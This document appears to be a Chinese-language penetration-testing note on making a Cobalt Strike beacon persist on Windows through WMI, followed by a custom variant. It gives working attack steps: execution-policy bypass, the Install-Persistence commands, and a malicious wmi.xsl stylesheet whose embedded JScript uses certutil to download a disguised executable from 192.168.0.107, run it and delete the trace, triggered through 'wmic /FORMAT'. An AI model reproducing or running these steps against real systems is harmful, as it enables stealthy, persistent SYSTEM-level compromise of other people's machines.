	https://gitee.com/RichChigga/WMI-Persistence
	cobalt strike ->payload generator->powershell(use x64)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/525.png)

	attack->文件下载，文件选择payload generator的脚本，local uri为随意文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/526.png)

	生成后地址替换进WMI-Persistence脚本内
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/527.png)

	# powershell -exec bypass
	PS > Import-Module .\WMI-Persistence.ps1
	PS > Install-Persistence
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/528.png)

	PS > Check-WMI  重启后即可上线system权限(要等待4-6分钟)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/529.png)

	自定义上线
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/530.png)

	attack->文件下载，exe木马指定为文件。local uri为随意文件，wmi.xsl放在web目录
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/531.png)

	修改wmi.xsl
```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe & %temp%/load.exe & certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete",0);
    ]]> </ms:script>
</stylesheet>

```
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/532.png)

	WMI-Persistence脚本修改payload地址为wmi.xsl
	$finalPayload=" wmic os get /FORMAT:`"$Payload`""
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/533.png)

	>powershell -exec bypass
	PS > Import-Module .\WMI-Persistence.ps1
	PS > Install-Persistence
	PS > Check-WMI
	PS > Remove-Persistence 删除模块
	重启后即可上线
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/534.png)